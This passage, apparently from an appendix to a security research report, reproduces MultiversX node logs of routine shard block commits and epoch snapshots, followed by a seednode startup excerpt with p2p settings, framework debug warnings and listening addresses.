[0;32mINFO [0m[2026-10-06 22:09:45.018] [process/block]      [0/3/78/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = c2df6b76de1588b28b1ec06cfa05c81c3933058b1c97ad9e5652b0dc9bf5ede8 
[0;32mINFO [0m[2026-10-06 22:09:51.021] [process/block]      [0/3/79/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = 4b0b3a4c9e3a679c8f38420cdf1645ad0da6df5c3be5cfe3d5b531df68908c33 
[0;32mINFO [0m[2026-10-06 22:09:57.018] [process/block]      [0/3/80/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = c125089cf86db66258ceaeeaaf307831269e6f927984381ba1327d1d2ebd9db7 
[0;32mINFO [0m[2026-10-06 22:10:03.020] [process/block]      [0/3/81/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = 00a057f4b042c2bef140bfab788d454b12becb77c2f1c00916503d55a857316c 
[0;32mINFO [0m[2026-10-06 22:10:09.019] [process/block]      [0/3/82/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 9809702a1e77c948885306d007bc4f808c900a4485f91164c1bffcc92244a18d 
[0;32mINFO [0m[2026-10-06 22:10:15.020] [process/block]      [0/3/83/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 8281c2d4b85db434674eddcd06b23edd60f1d8719a1c4e3173a8ece11833494d 
[0;32mINFO [0m[2026-10-06 22:10:21.017] [process/block]      [0/3/84/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 7617a76e3ed0a08125d4cc31372fc9faf667ee8781f754882cbc9554c2dc594b 
[0;32mINFO [0m[2026-10-06 22:10:27.030] [process/block]      [0/3/85/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = 38d25a0e5f43aaf12bf9ccce1fbca5866d05f0942613b579c505dee50bee70f2 
[0;32mINFO [0m[2026-10-06 22:10:33.020] [process/block]      [0/3/86/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 6711add0d388374d90aa72cde191e7a85bec19e461635eaf5eb41cb633836db8 
[0;32mINFO [0m[2026-10-06 22:10:39.018] [process/block]      [0/3/87/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 7c648ce0ac4bee03dd10c8ed577ecc38fd54b683bf2470b71bf1ca688ae0c7c3 
[0;32mINFO [0m[2026-10-06 22:10:45.020] [process/block]      [0/3/88/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 568996efae6f5dd82897a99442f959c7b3524380ac4058c1623ddf9c33cc9d74 
[0;32mINFO [0m[2026-10-06 22:10:51.026] [process/block]      [0/3/89/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 8e3efc51d7340a15b9ec97a76e08d2cd8f796df882eb52d49dd2da651b976d93 
[0;32mINFO [0m[2026-10-06 22:10:57.019] [process/block]      [0/3/90/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 777f9e331e8bc89ce35caef9ad66833f1c45c85fc833f9ee806e162d9fcbecc8 
[0;32mINFO [0m[2026-10-06 22:11:03.026] [process/block]      [0/3/91/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = 55cfa49c37fb227c9d6d2a11a7b5f576b3567a577abf1f87866453c10e0cd4b1 
[0;32mINFO [0m[2026-10-06 22:11:09.017] [process/block]      [0/3/92/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = d840d06c69b5bed70d30771423630c1a2f6c8bfb6f71cac0ec8334647eca1887 
[0;32mINFO [0m[2026-10-06 22:11:15.016] [process/block]      [0/3/93/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = 01e3691290f4845b1f61e94502fa26842d9524b8563a2b0c2ed2f7225db347eb 
[0;32mINFO [0m[2026-10-06 22:11:21.015] [process/block]      [0/3/94/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = 982c58e60487a5cfc307f5073005d5fe9859098e729e554e156519ed0382fad8 
[0;32mINFO [0m[2026-10-06 22:11:27.021] [process/block]      [0/3/95/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = 4bdf0dc4537cc235241a4eba59a1fb1d2610acaa127e06d86b158056fe17ca2e 
[0;32mINFO [0m[2026-10-06 22:11:33.021] [process/block]      [0/3/96/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = 3786d833a40cceaf8762d7efc194aaad48dbc2612ae4c15e7a23354b61597a3a 
[0;32mINFO [0m[2026-10-06 22:11:39.016] [process/block]      [0/3/97/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = 46f68051c07ec10a415e34657bbfee9193168c75e248dd61c0995a43352b4cff 
[0;32mINFO [0m[2026-10-06 22:11:45.016] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:45.016] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:47.018] [process/block]      [0/4/98/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 2e4ac356ca9669c64a52912eda71d8e7de3da77ae2a806a29b20744ff4631c20 
[0;32mINFO [0m[2026-10-06 22:11:47.026] [state]              [0/4/98/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 7abb6257950623b825e9971cfa6cf0373ea5b58fa0d712636b22661505fb7d59 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:51.027] [process/block]      [0/4/99/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 57fbb32eb6f3a9eb5f5623c6b9748eefaebbe036ad07a33c58b22a22a55b144e 
[0;32mINFO [0m[2026-10-06 22:11:57.023] [process/block]      [0/4/100/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 8cbcc4cdcb225e5eec1840e30f0006e362e6a30e3eb57bf59ca65bee72c6437a 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [0/4/101/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 450e8f4588f2565befa1001767997f32d2f11dd9ce2369e0ff9f22be85003ea5 
[0;32mINFO [0m[2026-10-06 22:12:09.027] [process/block]      [0/4/102/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = 57b9b6c0a2a6739b3a5c157a947a8cb02691dbd1822ff4e631dcfd39259ef7d1 
[0;32mINFO [0m[2026-10-06 22:12:15.025] [process/block]      [0/4/103/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 511179cba9362c163d7feeca9d028c1a4dd6cc45a2515d05989ca0c95671b519 
[0;32mINFO [0m[2026-10-06 22:12:21.030] [process/block]      [0/4/104/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 8aa9fea6c45c0ed64ef2c08e8c653c10830f1b1265ca19d8d2766757de7d8e56 
[0;32mINFO [0m[2026-10-06 22:12:27.018] [process/block]      [0/4/105/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = eaeb13980d6f07abc88a4b4ca4e87df847d29786ed8ee39b1c9720fbf5080b0a 
[0;32mINFO [0m[2026-10-06 22:12:33.022] [process/block]      [0/4/106/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 4c5c2cc0f2b18af6ac405c90959097fa478eed25df39874449d4f6ba8cefee70 
[0;32mINFO [0m[2026-10-06 22:12:39.016] [process/block]      [0/4/107/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = 056af6eaff801fc3a8059f78b8cfd871acc5d4c54dccabb1ae9bfddec4c52a47 
[0;32mINFO [0m[2026-10-06 22:12:45.020] [process/block]      [0/4/108/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = d6e139f47f3abc2702da50d0529c9e63cbebc9a01758d58d70fc40b3b844153e 
[0;32mINFO [0m[2026-10-06 22:12:51.021] [process/block]      [0/4/109/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 823c47fc41a85d6529bbb4178d94a47d28d5955efbc87fc730583bb6d8b80e42 
[0;32mINFO [0m[2026-10-06 22:12:57.020] [process/block]      [0/4/110/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 8933812d04ebf44ae0d2a367683c712ec62d998f1ccec32096287b2835009f78 
[0;32mINFO [0m[2026-10-06 22:13:03.021] [process/block]      [0/4/111/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 43c2456e4d2d62be12454a14b96b4b13bbe0e74994d3fe6d14260b15d9fb0641 
[0;32mINFO [0m[2026-10-06 22:13:09.021] [process/block]      [0/4/112/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = f345e83e89725fbe2d64efa0f7be92e459896dd0b5e3c994f03694779deba00e 
[0;32mINFO [0m[2026-10-06 22:13:15.022] [process/block]      [0/4/113/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = 4f943afc72543df1df88e8bab5789f34907812e92ee4472dec8588cf57f953f1 
[0;32mINFO [0m[2026-10-06 22:13:21.017] [process/block]      [0/4/114/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 09c7f0261d7f8888c63634481d907138843629c129700342f8d5c007293a607f 
[0;32mINFO [0m[2026-10-06 22:13:27.018] [process/block]      [0/4/115/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = daf1c778ffcca84911d0a0b010bef5ace505641e875d30a2fc03df342c6275cd 
[0;32mINFO [0m[2026-10-06 22:13:33.019] [process/block]      [0/4/116/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 2552105ebc45c5ed645d436330de9bde9ac1917698bd72650e6b1ab645f43b58 
[0;32mINFO [0m[2026-10-06 22:13:39.017] [process/block]      [0/4/117/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 2af755a6438542af6047e6e12ed3b202ec3cf6842ccad316fe66025bd8a4a40e 
[0;32mINFO [0m[2026-10-06 22:13:45.018] [process/block]      [0/4/118/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = 4c9163ea7c209b0ec402ce8882c60167e2cfb1342ee67773c62f997a711389a8 
[0;32mINFO [0m[2026-10-06 22:13:51.022] [process/block]      [0/4/119/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 9c710ec3423c79d14e555f015ef7a46a8eaacaecdc87f18c4b01db0ea581be3e 
[0;32mINFO [0m[2026-10-06 22:13:57.022] [process/block]      [0/4/120/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = 135025b050731fbf52a29c6713fa9857c34130f09e62875416028d495e16691b 
[0;32mINFO [0m[2026-10-06 22:14:03.003] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:03.003] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:05.194] [process/block]      [0/5/121/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = ece8dc1f956fb9db80e03d8c821472451f09036203daa9d325fe10db91a9b1a1 
[0;32mINFO [0m[2026-10-06 22:14:05.195] [state]              [0/5/121/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = f50cefa3cc02078d8a54b3274d0a93b3ec3b3ab6a7dcf5ae6c7b2637b315514f [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:09.022] [process/block]      [0/5/122/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = ad1152637f6c272af3a4ac7f8ba8ebfd9b23e9515c33093ab020f40e46800d16 
[0;32mINFO [0m[2026-10-06 22:14:15.019] [process/block]      [0/5/123/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 7acf78ea4b645517c4b7951b2a7e1f37492ee9926ed4d626cda21274a70ae186 
[0;32mINFO [0m[2026-10-06 22:14:21.022] [process/block]      [0/5/124/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = bc9aa6f3c352f6d061e137ee0dd3f4d910417c3c76322114a3ebeb08d613fa5a 
[0;32mINFO [0m[2026-10-06 22:14:27.020] [process/block]      [0/5/125/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = 8e73a4e45df464fa7056e956d9270973ed1518a96d9f40ad5e134483902bd834 
[0;32mINFO [0m[2026-10-06 22:14:33.020] [process/block]      [0/5/126/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = e5290014b14df591eb3c2709822eee2b0347a463003ad3efd057d019393de1ca 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [0/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 7, seednode log, startup excerpt

File `security-research/node-logs/seednode.log`. The full file is 6971 lines. After the startup lines shown below the remainder is exclusively the same five line peer status table printed every five seconds with no other content, so only the startup excerpt is embedded.

```text
[0;32mINFO [0m[2026-10-06 21:49:16.825]   starting seednode...                     
[0;32mINFO [0m[2026-10-06 21:49:16.825]   initialized with p2p config              [0;32mfilename[0m = ./config/p2p.toml 
[0;32mINFO [0m[2026-10-06 21:49:16.825]   file limits                              [0;32mcurrent[0m = 61440 [0;32mmax[0m = 9223372036854775807 [0;32mexpected[0m = 1024 
[0;32mINFO [0m[2026-10-06 21:49:16.825]   p2p private key: using the provided private key for p2p signing 
[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.

[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:	export GIN_MODE=release
 - using code:	gin.SetMode(gin.ReleaseMode)

[GIN-debug] GET    /log                      --> github.com/multiversx/mx-chain-go/cmd/seednode/api.registerLoggerWsRoute.func1 (4 handlers)
[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
Please check https://github.com/gin-gonic/gin/blob/master/docs/doc.md#dont-trust-all-proxies for details.
[GIN-debug] Listening and serving HTTP on localhost:8080
[0;33mWARN [0m[2026-10-06 21:49:16.846]   nil or empty initial peers list provided to kad dht implementation. No initial connection will be done 
[0;32mINFO [0m[2026-10-06 21:49:16.846]   listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/9999/p2p/16Uiu2HAmLpfZ6SjMhr7Nw3dEEdtB9D7mcwGTzY1QXRD8kPcNmu6j [0;32maddr1[0m = /ip4/172.20.10.5/tcp/9999/p2p/16Uiu2HAmLpfZ6SjMhr7Nw3dEEdtB9D7mcwGTzY1QXRD8kPcNmu6j 
[0;32mINFO [0m[2026-10-06 21:49:16.847]   started the network discovery process... 
[0;32mINFO [0m[2026-10-06 21:49:16.847]   application is now running...            
[0;32mINFO [0m[2026-10-06 21:49:16.847]   
+-------------------------------------------------------------------------------------+
| Seednode addresses:                                                                 |
+-------------------------------------------------------------------------------------+
| /ip4/127.0.0.1/tcp/9999/p2p/16Uiu2HAmLpfZ6SjMhr7Nw3dEEdtB9D7mcwGTzY1QXRD8kPcNmu6j   |
| /ip4/172.20.10.5/tcp/9999/p2p/16Uiu2HAmLpfZ6SjMhr7Nw3dEEdtB9D7mcwGTzY1QXRD8kPcNmu6j |
```
